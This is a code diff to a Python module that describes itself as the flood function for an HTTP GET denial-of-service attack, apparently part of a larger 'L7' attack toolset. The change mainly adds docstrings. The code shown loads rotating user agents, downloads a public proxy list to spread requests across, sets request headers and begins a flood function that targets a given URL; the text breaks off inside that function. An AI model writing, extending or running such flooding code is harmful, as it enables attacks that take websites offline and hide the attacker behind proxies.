@@ -1,14 +1,14 @@
+"""This module provides the flood function for a HTTP GET request DoS attack."""
+
 import json
 import random
 
 import requests
 from colorama import Fore  # type: ignore[import]
 
-# Loads user agents
 with open("tools/L7/user_agents.json", "r") as agents:
     user_agents = json.load(agents)["agents"]
 
-# Downloading proxies' address
 with requests.get(
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 ) as proxies:
@@ -17,7 +17,6 @@ with requests.get(
         if proxy != "":
             proxies_.append({"http": proxy, "https": proxy})
 
-# Headers
 headers = {
     "X-Requested-With": "XMLHttpRequest",
     "Connection": "keep-alive",
@@ -29,8 +28,14 @@ headers = {
 
 color_code = {True: Fore.GREEN, False: Fore.RED}
 
-# Flood function
+
 def flood(target: str, use_proxy: bool) -> None:
+    """Start the HTTP GET request flood.
+
+    Keyword arguments:
+    target -- target's URL
+    use_proxy -- whether or not to use proxy
+    """
     try:
         if use_proxy:
             proxy = random.choice(proxies_)
